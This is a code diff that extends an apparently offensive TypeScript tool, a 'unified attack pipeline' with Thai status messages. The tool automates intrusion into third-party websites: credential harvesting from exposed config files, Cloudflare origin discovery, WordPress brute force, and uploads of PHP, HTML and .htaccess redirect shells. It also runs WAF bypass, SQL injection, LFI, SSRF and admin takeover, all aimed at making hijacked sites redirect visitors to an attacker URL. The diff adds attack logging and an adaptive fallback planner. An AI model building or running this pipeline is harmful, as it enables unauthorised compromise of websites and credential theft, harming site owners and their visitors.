@@ -35,6 +35,8 @@ import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./no
 import { runComprehensiveAttackVectors, type AttackVectorResult, type AttackVectorConfig } from "./comprehensive-attack-vectors";
 import { findOriginIP, type OriginIPResult } from "./cf-origin-bypass";
 import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCredentials } from "./wp-brute-force";
+import { createAttackLogger, type AttackLogger } from "./attack-logger";
+import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -80,7 +82,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -746,11 +748,25 @@ export async function runUnifiedAttackPipeline(
   let prescreen: PreScreenResult | null = null;
   let vulnScan: VulnScanResult | null = null;
 
+  // ─── Attack Logger & Smart Fallback ───
+  const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+  const attackLogger = createAttackLogger(null, config.userId || 0, targetDomain);
+  const failedMethods: string[] = [];
+  let targetProfile: TargetProfile | null = null;
+  let fallbackPlan: FallbackPlan | null = null;
+
+  // Wrap onEvent to also log
+  const originalOnEvent = onEvent;
+  const loggedOnEvent: EventCallback = (event) => {
+    originalOnEvent(event);
+    attackLogger.log(event).catch(() => {});
+  };
+
   /** Check if pipeline should stop (timeout or success already achieved) */
   function shouldStop(reason?: string): boolean {
     if (pipelineAbort.signal.aborted) return true;
     if (Date.now() > deadline) {
-      onEvent({ phase: "error", step: "global_timeout", detail: `⏰ Global pipeline timeout (${GLOBAL_TIMEOUT / 60000}min) reached${reason ? ` during ${reason}` : ''} — wrapping up...`, progress: 99 });
+      loggedOnEvent({ phase: "error", step: "global_timeout", detail: `⏰ Global pipeline timeout (${GLOBAL_TIMEOUT / 60000}min) reached${reason ? ` during ${reason}` : ''} — wrapping up...`, progress: 99 });
       errors.push(`global_timeout_during_${reason || 'unknown'}`);
       return true;
     }
@@ -765,7 +781,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 0: AI Target Analysis (NEW — deep intelligence before attack) ───
   let aiTargetAnalysis: AiTargetAnalysis | null = null;
   try {
-    onEvent({
+    loggedOnEvent({
       phase: "ai_analysis",
       step: "start",
       detail: `🧠 Phase 0: AI Target Analysis — วิเคราะห์เว็บเป้าหมาย ${config.targetUrl} อย่างละเอียด...`,
@@ -777,7 +793,7 @@ export async function runUnifiedAttackPipeline(
         config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, ""),
         (step: AnalysisStep) => {
           // Stream each analysis step to frontend
-          onEvent({
+          loggedOnEvent({
             phase: "ai_analysis",
             step: step.stepId,
             detail: `🧠 [${step.stepName}] ${step.detail}`,
@@ -793,7 +809,7 @@ export async function runUnifiedAttackPipeline(
 
     aiDecisions.push(`AI Analysis: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"} server, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"}, DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, Success: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`);
 
-    onEvent({
+    loggedOnEvent({
       phase: "ai_analysis",
       step: "complete",
       detail: `✅ AI Analysis เสร็จ — Server: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"}, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"} (${aiTargetAnalysis.security.wafStrength}), DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, โอกาสสำเร็จ: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`,
@@ -802,7 +818,7 @@ export async function runUnifiedAttackPipeline(
     });
   } catch (error: any) {
     errors.push(`AI Target Analysis failed: ${error.message}`);
-    onEvent({
+    loggedOnEvent({
       phase: "ai_analysis",
       step: "error",
       detail: `⚠️ AI Analysis ล้มเหลว: ${error.message} — ดำเนินการต่อด้วย pre-screen แบบเดิม`,
@@ -810,7 +826,7 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
-  onEvent({
+  loggedOnEvent({
     phase: "prescreen",
     step: "start",
     detail: `🔍 เริ่มวิเคราะห์เป้าหมาย: ${config.targetUrl}`,
@@ -819,7 +835,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 1: Pre-screening (uses AI analysis data if available) ───
   try {
-    onEvent({
+    loggedOnEvent({
       phase: "prescreen",
       step: "scanning",
       detail: "🔍 Phase 1: Pre-screening — ตรวจสอบเพิ่มเติมจาก AI analysis...",
@@ -859,7 +875,7 @@ export async function runUnifiedAttackPipeline(
 
     aiDecisions.push(`Pre-screen: ${prescreen.serverType || "Unknown"} server, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, Success probability: ${prescreen.overallSuccessProbability}%`);
 
-    onEvent({
+    loggedOnEvent({
       phase: "prescreen",
       step: "complete",
       detail: `✅ Pre-screen เสร็จ — Server: ${prescreen.serverType || "Unknown"}, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, โอกาสสำเร็จ: ${prescreen.overallSuccessProbability}%`,
@@ -868,7 +884,7 @@ export async function runUnifiedAttackPipeline(
     });
 
     // Emit world state update after prescreen
-    onEvent({
+    loggedOnEvent({
       phase: "world_update",
       step: "prescreen_done",
       detail: "World state updated from pre-screen",
@@ -886,7 +902,7 @@ export async function runUnifiedAttackPipeline(
     });
   } catch (error: any) {
     errors.push(`Pre-screen failed: ${error.message}`);
-    onEvent({
+    loggedOnEvent({
       phase: "prescreen",
       step: "error",
       detail: `⚠️ Pre-screen ล้มเหลว: ${error.message} — ดำเนินการต่อด้วยข้อมูลจำกัด`,
@@ -894,9 +910,38 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
+  // ═══ SMART FALLBACK: Build target profile after prescreen ═══
+  try {
+    targetProfile = buildTargetProfile(targetDomain, prescreen, aiTargetAnalysis);
+    fallbackPlan = generateFallbackPlan(targetProfile, attackLogger, GLOBAL_TIMEOUT / 1000, failedMethods);
+    
+    loggedOnEvent({
+      phase: "smart_fallback",
+      step: "plan_generated",
+      detail: `🧠 Smart Fallback Plan: ${fallbackPlan.strategy} — ${fallbackPlan.methods.length} methods, ${fallbackPlan.skipMethods.length} skipped`,
+      progress: 19,
+      data: {
+        strategy: fallbackPlan.strategy,
+        methodCount: fallbackPlan.methods.length,
+        skipCount: fallbackPlan.skipMethods.length,
+        topMethods: fallbackPlan.methods.slice(0, 5).map(m => ({
+          name: m.method.name,
+          successRate: m.estimatedSuccessRate,
+          category: m.method.category,
+        })),
+        shouldSkipUploads: shouldSkipUploads(targetProfile),
+        optimalRetries: getOptimalRetryCount(targetProfile),
+      },
+    });
+    
+    aiDecisions.push(`Smart Fallback: ${fallbackPlan.strategy}, ${fallbackPlan.methods.length} methods queued`);
+  } catch (e: any) {
+    console.error("[Smart Fallback] Error:", e.message);
+  }
+
   // ─── Phase 2: Deep Vulnerability Scan ───
   try {
-    onEvent({
+    loggedOnEvent({
       phase: "vuln_scan",
       step: "scanning",
       detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
@@ -905,7 +950,7 @@ export async function runUnifiedAttackPipeline(
 
     vulnScan = await Promise.race([
       fullVulnScan(config.targetUrl, (step: string, detail: string, progress: number) => {
-        onEvent({
+        loggedOnEvent({
           phase: "vuln_scan",
           step,
           detail: `🔬 ${detail}`,
@@ -920,7 +965,7 @@ export async function runUnifiedAttackPipeline(
       aiDecisions.push(`Deep scan: ${vulnScan.writablePaths.length} writable paths, ${vulnScan.uploadEndpoints.length} upload endpoints, ${vulnScan.attackVectors.length} attack vectors`);
       aiDecisions.push(`Top vectors: ${topVectors.map(v => `${v.name} (${v.successProbability}%)`).join(", ")}`);
 
-      onEvent({
+      loggedOnEvent({
         phase: "vuln_scan",
         step: "complete",
         detail: `✅ Deep scan เสร็จ — ${vulnScan.writablePaths.length} writable paths, ${vulnScan.attackVectors.length} attack vectors`,
@@ -929,7 +974,7 @@ export async function runUnifiedAttackPipeline(
       });
 
       // Emit world state update after vuln scan
-      onEvent({
+      loggedOnEvent({
         phase: "world_update",
         step: "vulnscan_done",
         detail: "World state updated from vulnerability scan",
@@ -948,7 +993,7 @@ export async function runUnifiedAttackPipeline(
     }
   } catch (error: any) {
     errors.push(`Vuln scan failed: ${error.message}`);
-    onEvent({
+    loggedOnEvent({
       phase: "vuln_scan",
       step: "error",
       detail: `⚠️ Deep scan ล้มเหลว: ${error.message} — ใช้ข้อมูลจาก pre-screen`,
@@ -965,7 +1010,7 @@ export async function runUnifiedAttackPipeline(
 
   if (config.enableConfigExploit !== false && !shouldStop('config_exploit')) {
     try {
-      onEvent({
+      loggedOnEvent({
         phase: "config_exploit",
         step: "scanning",
         detail: "🔓 Phase 2.5a: Config Exploitation — ค้นหา backup files, .env, phpinfo, credentials...",
@@ -977,7 +1022,7 @@ export async function runUnifiedAttackPipeline(
           targetUrl: config.targetUrl,
           timeout: config.timeoutPerMethod || 30000,
           onProgress: (vector: string, detail: string) => {
-            onEvent({
+            loggedOnEvent({
               phase: "config_exploit",
               step: vector,
               detail: `🔓 ${detail}`,
@@ -998,7 +1043,7 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`🔑 Discovered ${discoveredCredentials.length} credentials — will use for authenticated uploads`);
       }
 
-      onEvent({
+      loggedOnEvent({
         phase: "config_exploit",
         step: "complete",
         detail: `✅ Config exploit เสร็จ — ${successExploits.length} findings, ${discoveredCredentials.length} credentials`,
@@ -1012,7 +1057,7 @@ export async function runUnifiedAttackPipeline(
 
   if (config.enableDnsAttacks !== false && !shouldStop('dns_recon')) {
     try {
-      onEvent({
+      loggedOnEvent({
         phase: "dns_attack",
         step: "scanning",
         detail: "🌐 Phase 2.5b: DNS Recon — Origin IP discovery, subdomain takeover, DNS rebinding...",
@@ -1025,7 +1070,7 @@ export async function runUnifiedAttackPipeline(
           targetDomain,
           timeout: config.timeoutPerMethod || 30000,
           onProgress: (vector: string, detail: string) => {
-            onEvent({
+            loggedOnEvent({
               phase: "dns_attack",
               step: vector,
               detail: `🌐 ${detail}`,
@@ -1047,7 +1092,7 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`🎯 Subdomain takeover possible: ${takeoverResult.data?.vulnerableSubdomains?.map(s => s.subdomain).join(", ") || "unknown"}`);
       }
 
-      onEvent({
+      loggedOnEvent({
         phase: "dns_attack",
         step: "complete",
         detail: `✅ DNS recon เสร็จ — ${successDns.length} findings${originIp ? `, Origin IP: ${originIp}` : ""}`,
@@ -1067,7 +1112,7 @@ export async function runUnifiedAttackPipeline(
   if (isCloudflare && !shouldStop('cf_bypass')) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
-      onEvent({
+      loggedOnEvent({
         phase: "cf_bypass",
         step: "scanning",
         detail: "☁️ Phase 2.5c: Cloudflare Origin IP Bypass — Shodan SSL, DNS History, MX/SPF, Subdomain Enum...",
@@ -1076,7 +1121,7 @@ export async function runUnifiedAttackPipeline(
 
       cfBypassResult = await Promise.race([
         findOriginIP(targetDomain, (msg) => {
-          onEvent({
+          loggedOnEvent({
             phase: "cf_bypass",
             step: "scanning",
             detail: `☁️ ${msg}`,
@@ -1096,7 +1141,7 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`☁️ CF Bypass: Origin IP candidate ${originIp} (unverified, confidence: ${bestCandidate.confidence}%, source: ${bestCandidate.source})`);
       }
 
-      onEvent({
+      loggedOnEvent({
         phase: "cf_bypass",
         step: "complete",
         detail: `✅ CF Bypass เสร็จ — ${cfBypassResult.allCandidates.length} candidates, verified: ${cfBypassResult.verified}${originIp ? `, Origin IP: ${originIp}` : ""}`,
@@ -1105,7 +1150,7 @@ export async function runUnifiedAttackPipeline(
       });
     } catch (error: any) {
       errors.push(`CF bypass failed: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "cf_bypass",
         step: "error",
         detail: `⚠️ CF Bypass ล้มเหลว: ${error.message}`,
@@ -1123,7 +1168,7 @@ export async function runUnifiedAttackPipeline(
   if (isWordPress && !shouldStop('wp_brute_force') && !hasSuccessfulRedirect()) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
-      onEvent({
+      loggedOnEvent({
         phase: "wp_brute_force",
         step: "scanning",
         detail: "🔑 Phase 2.5d: WP Brute Force — Username enum + XMLRPC/wp-login credential testing...",
@@ -1144,7 +1189,7 @@ export async function runUnifiedAttackPipeline(
           globalTimeout: bruteForceTimeout, // Respect pipeline deadline
           originIP: originIp,
           onProgress: (msg) => {
-            onEvent({
+            loggedOnEvent({
               phase: "wp_brute_force",
               step: "testing",
               detail: `🔑 ${msg}`,
@@ -1162,7 +1207,7 @@ export async function runUnifiedAttackPipeline(
         // Immediately try authenticated upload with quick redirect shell
         {
           const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
-          onEvent({
+          loggedOnEvent({
             phase: "wp_brute_force",
             step: "uploading",
             detail: "🔑 ลอง authenticated upload ด้วย credentials ที่ได้...",
@@ -1178,7 +1223,7 @@ export async function runUnifiedAttackPipeline(
             "application/x-php",
             originIp,
             (msg) => {
-              onEvent({
+              loggedOnEvent({
                 phase: "wp_brute_force",
                 step: "uploading",
                 detail: `🔑 ${msg}`,
@@ -1209,7 +1254,7 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`🔑 WP Brute Force: ${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users found, no valid credentials`);
       }
 
-      onEvent({
+      loggedOnEvent({
         phase: "wp_brute_force",
         step: "complete",
         detail: `✅ WP Brute Force เสร็จ — ${wpBruteForceResult.success ? "สำเร็จ!" : "ไม่พบ credentials"} (${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users)`,
@@ -1218,7 +1263,7 @@ export async function runUnifiedAttackPipeline(
       });
     } catch (error: any) {
       errors.push(`WP brute force failed: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "wp_brute_force",
         step: "error",
         detail: `⚠️ WP Brute Force ล้มเหลว: ${error.message}`,
@@ -1234,10 +1279,10 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 3: Shell Generation ───
   let shells: GeneratedShell[] = [];
   if (shouldStop('shell_gen') || hasSuccessfulRedirect()) {
-    onEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${hasSuccessfulRedirect() ? 'already have successful redirect' : 'timeout'}`, progress: 50 });
+    loggedOnEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${hasSuccessfulRedirect() ? 'already have successful redirect' : 'timeout'}`, progress: 50 });
   } else
   try {
-    onEvent({
+    loggedOnEvent({
       phase: "shell_gen",
       step: "generating",
       detail: "🔧 Phase 3: AI Shell Generation — สร้าง redirect shells ตาม target profile...",
@@ -1291,7 +1336,7 @@ export async function runUnifiedAttackPipeline(
       } as VulnScanResult,
       shellConfig,
       (detail) => {
-        onEvent({
+        loggedOnEvent({
           phase: "shell_gen",
           step: "generating",
           detail,
@@ -1302,7 +1347,7 @@ export async function runUnifiedAttackPipeline(
 
     aiDecisions.push(`Generated ${shells.length} shells: ${shells.map(s => s.type).join(", ")}`);
 
-    onEvent({
+    loggedOnEvent({
       phase: "shell_gen",
       step: "complete",
       detail: `✅ สร้าง ${shells.length} shell payloads เสร็จ`,
@@ -1311,7 +1356,7 @@ export async function runUnifiedAttackPipeline(
     });
   } catch (error: any) {
     errors.push(`Shell generation failed: ${error.message}`);
-    onEvent({
+    loggedOnEvent({
       phase: "shell_gen",
       step: "error",
       detail: `⚠️ Shell generation ล้มเหลว: ${error.message}`,
@@ -1323,7 +1368,7 @@ export async function runUnifiedAttackPipeline(
   let totalAttempts = 0;
 
   if (shells.length > 0 && !shouldStop('upload') && !hasSuccessfulRedirect()) {
-    onEvent({
+    loggedOnEvent({
       phase: "upload",
       step: "start",
       detail: `📤 Phase 4: Upload — ลอง upload ${shells.length} shells ด้วยทุกวิธี...`,
@@ -1352,7 +1397,7 @@ export async function runUnifiedAttackPipeline(
 
       // Skip PHP shells if we already know PHP doesn't execute on this server
       if (phpExecutionFailed && (shell.type === "redirect_php" || shell.type === "steganography" || shell.type === "polyglot")) {
-        onEvent({
+        loggedOnEvent({
           phase: "upload",
           step: `shell_${i + 1}_skip`,
           detail: `⏭️ Skip ${shell.type} (${shell.filename}) — PHP ไม่ถูก execute บน server นี้`,
@@ -1363,7 +1408,7 @@ export async function runUnifiedAttackPipeline(
 
       totalAttempts++;
 
-      onEvent({
+      loggedOnEvent({
         phase: "upload",
         step: `shell_${i + 1}`,
         detail: `📤 Upload shell ${i + 1}/${sortedShells.length}: ${shell.type} (${shell.filename})`,
@@ -1382,7 +1427,7 @@ export async function runUnifiedAttackPipeline(
 
       if (uploadResult.success && uploadResult.url) {
         // Verify the uploaded file
-        onEvent({
+        loggedOnEvent({
           phase: "verify",
           step: "checking",
           detail: `🔍 Verifying: ${uploadResult.url}`,
@@ -1407,7 +1452,7 @@ export async function runUnifiedAttackPipeline(
 
         // If we have a verified redirect TO THE CORRECT DESTINATION, we can stop
         if (verification.redirectWorks && verification.redirectDestinationMatch) {
-          onEvent({
+          loggedOnEvent({
             phase: "complete",
             step: "success",
             detail: `🎉 สำเร็จ! Redirect ไปยังปลายทางจริง: ${uploadResult.url} → ${verification.finalDestination}`,
@@ -1418,7 +1463,7 @@ export async function runUnifiedAttackPipeline(
 
         // Redirect works but goes to wrong destination
         if (verification.redirectWorks && !verification.redirectDestinationMatch) {
-          onEvent({
+          loggedOnEvent({
             phase: "verify",
             step: "destination_mismatch",
             detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${uploadResult.url} → ${verification.finalDestination} (ควรไป ${config.redirectUrl}) — ลองต่อ`,
@@ -1432,7 +1477,7 @@ export async function runUnifiedAttackPipeline(
           // ═══ AUTO-FALLBACK: PHP not executing → try HTML/htaccess at same path ═══
           if (verification.phpNotExecuting) {
             phpExecutionFailed = true; // Mark so subsequent PHP shells are skipped
-            onEvent({
+            loggedOnEvent({
               phase: "upload",
               step: "php_fallback",
               detail: `🔄 PHP ไม่ถูก execute — Auto-fallback: ลอง upload .html redirect ที่ path เดียวกัน`,
@@ -1476,7 +1521,7 @@ export async function runUnifiedAttackPipeline(
               aiDecisions.push(`🔄 PHP fallback → HTML: ${htmlUploadResult.url} (verified: ${htmlVerification.verified}, redirect: ${htmlVerification.redirectWorks})`);
 
               if (htmlVerification.redirectWorks) {
-                onEvent({
+                loggedOnEvent({
                   phase: "complete",
                   step: "success",
                   detail: `🎉 HTML fallback สำเร็จ! Redirect ทำงาน: ${htmlUploadResult.url} → ${config.redirectUrl}`,
@@ -1518,7 +1563,7 @@ export async function runUnifiedAttackPipeline(
               aiDecisions.push(`🔄 PHP fallback → .htaccess: ${htaccessUploadResult.url} (verified: ${htaccessVerification.verified}, redirect: ${htaccessVerification.redirectWorks})`);
 
               if (htaccessVerification.redirectWorks) {
-                onEvent({
+                loggedOnEvent({
                   phase: "complete",
                   step: "success",
                   detail: `🎉 .htaccess fallback สำเร็จ! Redirect ทำงาน: ${dirUrl} → ${config.redirectUrl}`,
@@ -1529,7 +1574,7 @@ export async function runUnifiedAttackPipeline(
             }
           }
 
-          onEvent({
+          loggedOnEvent({
             phase: "upload",
             step: "partial",
             detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน${verification.phpNotExecuting ? " (PHP ไม่ execute + HTML/htaccess fallback ล้มเหลว)" : ""} — ลอง shell ถัดไป`,
@@ -1540,7 +1585,7 @@ export async function runUnifiedAttackPipeline(
 
       // Stop after 5 failed attempts to avoid wasting time
       if (totalAttempts >= (config.maxUploadAttempts || 8) && uploadedFiles.length === 0) {
-        onEvent({
+        loggedOnEvent({
           phase: "upload",
           step: "max_attempts",
           detail: `⚠️ ลอง ${totalAttempts} ครั้งแล้ว ยังไม่สำเร็จ — หยุดเพื่อประหยัดเวลา`,
@@ -1566,7 +1611,7 @@ export async function runUnifiedAttackPipeline(
     // 4.5a: WAF Bypass uploads
     if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !hasSuccessfulRedirect()) {
       try {
-        onEvent({
+        loggedOnEvent({
           phase: "waf_bypass",
           step: "start",
           detail: `🛡️ Phase 4.5a: WAF Bypass — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
@@ -1589,7 +1634,7 @@ export async function runUnifiedAttackPipeline(
             originalFilename: bestShell.filename,
             timeout: config.timeoutPerMethod || 30000,
             onProgress: (method: string, detail: string) => {
-              onEvent({
+              loggedOnEvent({
                 phase: "waf_bypass",
                 step: method,
                 detail: `🛡️ ${detail}`,
@@ -1617,7 +1662,7 @@ export async function runUnifiedAttackPipeline(
           });
         }
 
-        onEvent({
+        loggedOnEvent({
           phase: "waf_bypass",
           step: "complete",
           detail: `✅ WAF bypass เสร็จ — ${wafBypassResults.filter(r => r.success).length}/${wafBypassResults.length} methods สำเร็จ`,
@@ -1631,7 +1676,7 @@ export async function runUnifiedAttackPipeline(
     // 4.5b: Alternative Upload Vectors
     if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('alt_upload') && !hasSuccessfulRedirect()) {
       try {
-        onEvent({
+        loggedOnEvent({
           phase: "alt_upload",
           step: "start",
           detail: `📡 Phase 4.5b: Alt Upload — XML-RPC, REST API, WebDAV, FTP, cPanel, Git exploit...`,
@@ -1651,7 +1696,7 @@ export async function runUnifiedAttackPipeline(
             ftpCredentials: ftpCreds.length > 0 ? ftpCreds : undefined,
             timeout: config.timeoutPerMethod || 30000,
             onProgress: (vector: string, detail: string) => {
-              onEvent({
+              loggedOnEvent({
                 phase: "alt_upload",
                 step: vector,
                 detail: `📡 ${detail}`,
@@ -1679,7 +1724,7 @@ export async function runUnifiedAttackPipeline(
           });
         }
 
-        onEvent({
+        loggedOnEvent({
           phase: "alt_upload",
           step: "complete",
           detail: `✅ Alt upload เสร็จ — ${altUploadResults.filter(r => r.success).length}/${altUploadResults.length} methods สำเร็จ`,
@@ -1693,7 +1738,7 @@ export async function runUnifiedAttackPipeline(
     // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
     if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('indirect') && !hasSuccessfulRedirect()) {
       try {
-        onEvent({
+        loggedOnEvent({
           phase: "indirect",
           step: "start",
           detail: `💉 Phase 4.5c: Indirect Attacks — SQLi File Write, LFI/RFI, Log Poisoning, SSRF...`,
@@ -1708,7 +1753,7 @@ export async function runUnifiedAttackPipeline(
             redirectUrl: config.redirectUrl,
             timeout: config.timeoutPerMethod || 30000,
             onProgress: (vector: string, detail: string) => {
-              onEvent({
+              loggedOnEvent({
                 phase: "indirect",
                 step: vector,
                 detail: `💉 ${detail}`,
@@ -1736,7 +1781,7 @@ export async function runUnifiedAttackPipeline(
           });
         }
 
-        onEvent({
+        loggedOnEvent({
           phase: "indirect",
           step: "complete",
           detail: `✅ Indirect attacks เสร็จ — ${indirectResults.filter(r => r.success).length}/${indirectResults.length} methods สำเร็จ`,
@@ -1756,7 +1801,7 @@ export async function runUnifiedAttackPipeline(
     // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
     if (config.enableWpAdminTakeover !== false) {
       try {
-        onEvent({
+        loggedOnEvent({
           phase: "wp_admin",
           step: "start",
           detail: `🔐 Phase 4.6a: WP Admin Takeover — Brute Force + Theme/Plugin Editor + XMLRPC + REST API...`,
@@ -1772,7 +1817,7 @@ export async function runUnifiedAttackPipeline(
             .filter((c: any) => c.username && c.password)
             .map((c: any) => ({ username: c.username, password: c.password })),
           onProgress: (method: string, detail: string) => {
-            onEvent({
+            loggedOnEvent({
               phase: "wp_admin",
               step: method,
               detail: `🔐 ${detail}`,
@@ -1805,7 +1850,7 @@ export async function runUnifiedAttackPipeline(
             redirectChain: wpVerification.redirectChain,
           });
 
-          onEvent({
+          loggedOnEvent({
             phase: "wp_admin",
             step: "success",
             detail: `✅ WP Admin Takeover สำเร็จ: ${wpSuccess.method} — ${wpSuccess.detail}`,
@@ -1813,7 +1858,7 @@ export async function runUnifiedAttackPipeline(
             data: { wpAdminResults },
           });
         } else {
-          onEvent({
+          loggedOnEvent({
             phase: "wp_admin",
             step: "complete",
             detail: `⚠️ WP Admin Takeover ล้มเหลว — ลอง ${wpAdminResults.length} methods`,
@@ -1823,7 +1868,7 @@ export async function runUnifiedAttackPipeline(
         }
       } catch (error: any) {
         errors.push(`WP Admin Takeover failed: ${error.message}`);
-        onEvent({
+        loggedOnEvent({
           phase: "wp_admin",
           step: "error",
           detail: `⚠️ WP Admin Takeover error: ${error.message}`,
@@ -1835,7 +1880,7 @@ export async function runUnifiedAttackPipeline(
     // 4.6b: WP Database Injection (SQLi → wp_options/wp_posts/widgets/.htaccess/cPanel)
     if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_db_inject')) {
       try {
-        onEvent({
+        loggedOnEvent({
           phase: "wp_db_inject",
           step: "start",
           detail: `💉 Phase 4.6b: WP DB Injection — SQLi wp_options/wp_posts, .htaccess, cPanel takeover...`,
@@ -1858,7 +1903,7 @@ export async function runUnifiedAttackPipeline(
           sqliParam: sqliParamMatch?.[1] || "id",
           sqliType: sqliEvidence.includes("time") ? "time" as const : sqliEvidence.includes("union") ? "union" as const : "error" as const,
           onProgress: (method: string, detail: string) => {
-            onEvent({
+            loggedOnEvent({
               phase: "wp_db_inject",
               step: method,
               detail: `💉 ${detail}`,
@@ -1890,7 +1935,7 @@ export async function runUnifiedAttackPipeline(
             redirectChain: dbVerification.redirectChain,
           });
 
-          onEvent({
+          loggedOnEvent({
             phase: "wp_db_inject",
             step: "success",
             detail: `✅ WP DB Injection สำเร็จ: ${dbSuccess.method} — ${dbSuccess.detail}`,
@@ -1898,7 +1943,7 @@ export async function runUnifiedAttackPipeline(
             data: { wpDbInjectionResults },
           });
         } else {
-          onEvent({
+          loggedOnEvent({
             phase: "wp_db_inject",
             step: "complete",
             detail: `⚠️ WP DB Injection ล้มเหลว — ลอง ${wpDbInjectionResults.length} methods`,
@@ -1908,7 +1953,7 @@ export async function runUnifiedAttackPipeline(
         }
       } catch (error: any) {
         errors.push(`WP DB Injection failed: ${error.message}`);
-        onEvent({
+        loggedOnEvent({
           phase: "wp_db_inject",
           step: "error",
           detail: `⚠️ WP DB Injection error: ${error.message}`,
@@ -1925,7 +1970,7 @@ export async function runUnifiedAttackPipeline(
   const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;
 
   if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget) && !shouldStop('nonwp_exploits') && !hasSuccessfulRedirect()) {
-    onEvent({
+    loggedOnEvent({
       phase: "shellless" as any,
       step: "nonwp_exploits_start",
       detail: `\uD83D\uDD0D Non-WP Exploits \u0E40\u0E23\u0E34\u0E48\u0E21\u0E17\u0E33\u0E07\u0E32\u0E19 \u2014 \u0E2A\u0E41\u0E01\u0E19 CMS-specific vulnerabilities (${detectedCms || "generic"})...`,
@@ -1942,7 +1987,7 @@ export async function runUnifiedAttackPipeline(
         shellFileName: shells[0]?.filename || `cache-${Date.now()}.php`,
         timeout: config.timeoutPerMethod || 15000,
         onProgress: (method, detail) => {
-          onEvent({
+          loggedOnEvent({
             phase: "shellless" as any,
             step: `nonwp_${method}`,
             detail: `\uD83D\uDD0D [Non-WP] ${method}: ${detail}`,
@@ -1971,7 +2016,7 @@ export async function runUnifiedAttackPipeline(
           });
         }
         aiDecisions.push(`Non-WP Exploits SUCCESS: ${successfulUploads.map(e => e.method).join(", ")}`);
-        onEvent({
+        loggedOnEvent({
           phase: "shellless" as any,
           step: "nonwp_exploits_success",
           detail: `\u2705 Non-WP Exploits \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08! ${successfulUploads.length} exploit(s) \u0E27\u0E32\u0E07\u0E44\u0E1F\u0E25\u0E4C\u0E44\u0E14\u0E49: ${successfulUploads.map(e => `${e.method} (${e.severity})`).join(", ")}`,
@@ -1981,7 +2026,7 @@ export async function runUnifiedAttackPipeline(
       } else {
         const findings = nonWpExploitResults.results.filter(r => r.success);
         aiDecisions.push(`Non-WP Exploits: ${findings.length} findings, 0 file uploads`);
-        onEvent({
+        loggedOnEvent({
           phase: "shellless" as any,
           step: "nonwp_exploits_done",
           detail: `\uD83D\uDCCB Non-WP Exploits: ${findings.length} vulnerabilities found, no file upload \u2014 \u0E2A\u0E48\u0E07\u0E15\u0E48\u0E2D\u0E43\u0E2B\u0E49 shellless + AI Commander`,
